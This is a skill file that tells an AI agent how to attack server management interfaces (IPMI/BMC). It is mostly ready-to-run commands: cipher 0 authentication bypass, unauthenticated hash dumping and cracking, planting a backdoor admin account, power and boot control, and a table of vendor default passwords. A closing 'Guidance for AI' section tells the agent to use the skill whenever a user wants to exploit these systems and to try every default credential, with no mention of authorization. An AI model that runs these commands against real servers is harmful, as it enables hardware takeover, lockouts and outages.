# IPMI Pentesting Skill

## Goal

Exploit IPMI (Intelligent Platform Management Interface) and BMC (Baseboard Management Controller) to gain remote access to physical servers.

## Methodology

1. **Discovery**: Identify IPMI/BMC services
2. **Enumeration**: Extract version and configuration info
3. **Authentication Bypass**: Exploit cipher 0 or hash disclosure
4. **Credential Attacks**: Dump hashes, brute-force
5. **Remote Access**: Gain KVM/console access

## Port

- 623/UDP: IPMI

## Background

IPMI provides out-of-band management:
- Always on (even when server is off)
- Direct hardware access
- Console/KVM access
- Power control

## Tools

* **ipmitool**: IPMI management utility
* **ipmiutil**: IPMI utilities
* **nmap**: IPMI scripts
* **Metasploit**: IPMI modules

## Example Commands

```bash
# Nmap IPMI detection
nmap -sU -p623 --script ipmi-* target
nmap -sU -p623 --script ipmi-version target
nmap -sU -p623 --script ipmi-brute target

# Using ipmitool
ipmitool -I lanplus -H target -U admin -P password chassis status
ipmitool -I lanplus -H target -U admin -P password user list
```

## IPMI 2.0 Hash Disclosure (CVE-2013-4786)

```bash
# IPMI 2.0 RAKP authentication discloses password hash
# Hash can be captured without valid credentials!

# Using Metasploit
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS target
run

# Output format: username:hostname:hash
# Crack with hashcat (mode 7300)
hashcat -m 7300 hashes.txt wordlist.txt
```

## Cipher 0 Authentication Bypass

```bash
# Cipher 0 allows authentication with any password!

# Check for cipher 0
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS target
run

# Exploit with ipmitool
ipmitool -I lanplus -C 0 -H target -U admin -P anything user list

# List users
ipmitool -I lanplus -C 0 -H target -U admin -P x user list

# Change admin password
ipmitool -I lanplus -C 0 -H target -U admin -P x user set password 2 newpassword

# Create new admin user
ipmitool -I lanplus -C 0 -H target -U admin -P x user set name 5 hacker
ipmitool -I lanplus -C 0 -H target -U admin -P x user set password 5 password
ipmitool -I lanplus -C 0 -H target -U admin -P x user priv 5 4
ipmitool -I lanplus -C 0 -H target -U admin -P x user enable 5
```

## User Enumeration

```bash
# List users (if you have credentials)
ipmitool -I lanplus -H target -U admin -P password user list

# Output shows user IDs and privilege levels
# Privilege levels:
# 1 = Callback
# 2 = User
# 3 = Operator
# 4 = Administrator
```

## Remote Console Access

```bash
# Serial over LAN (SOL) - text console
ipmitool -I lanplus -H target -U admin -P password sol activate

# Many IPMI/BMC controllers have web interfaces
# Common ports: 80, 443, 8080
# Default credentials vary by vendor

# Common defaults:
# DELL iDRAC: root / calvin
# HP iLO: Administrator / <random or on sticker>
# Supermicro: ADMIN / ADMIN
# IBM IMM: USERID / PASSW0RD
```

## Power Control

```bash
# Power status
ipmitool -I lanplus -H target -U admin -P password chassis status

# Power on
ipmitool -I lanplus -H target -U admin -P password chassis power on

# Power off
ipmitool -I lanplus -H target -U admin -P password chassis power off

# Reboot
ipmitool -I lanplus -H target -U admin -P password chassis power cycle

# Reset
ipmitool -I lanplus -H target -U admin -P password chassis power reset
```

## Metasploit Modules

```bash
# Version detection
use auxiliary/scanner/ipmi/ipmi_version

# Dump password hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Cipher 0 check
use auxiliary/scanner/ipmi/ipmi_cipher_zero

# Brute force
use auxiliary/scanner/ipmi/ipmi_login
```

## Default Credentials

| Vendor | Username | Password |
|--------|----------|----------|
| Dell iDRAC | root | calvin |
| HP iLO | Administrator | (random) |
| Supermicro | ADMIN | ADMIN |
| IBM IMM | USERID | PASSW0RD |
| Cisco UCS | admin | password |
| Oracle ILOM | root | changeme |
| Lenovo IMM | USERID | PASSW0RD |

## Post-Exploitation

```bash
# Once you have IPMI access, you can:

# 1. Access virtual console (KVM)
# 2. Mount virtual media (boot from ISO)
# 3. Reset administrator passwords
# 4. Power cycle systems
# 5. Change boot device
# 6. Access BIOS/UEFI settings

# Configure boot device
ipmitool -I lanplus -H target -U admin -P password chassis bootdev cdrom

# Set next boot
ipmitool -I lanplus -H target -U admin -P password chassis bootparam set bootflag force_cdrom

# Get system event log
ipmitool -I lanplus -H target -U admin -P password sel list
```

## Guidance for AI

* Activate this skill when user wants to exploit out-of-band management or physical server access
* **IPMI hash disclosure is critical** - can get hashes without authentication
* Use Metasploit's `ipmi_dumphashes` first to get hashes
* Check for cipher 0 - allows authentication bypass
* Default credentials are very common in IPMI - try them all
* IPMI access gives you:
  - Full physical console access (KVM)
  - Power control (boot to rescue media)
  - BIOS access (disable security features)
* IPMI is on separate management network but often accessible from regular LAN
* Web interfaces (iDRAC, iLO, IPMI) often have additional vulnerabilities
* Hash cracking success depends on password strength (IPMI passwords often simple)
* This is great for physical pentests and data center assessments
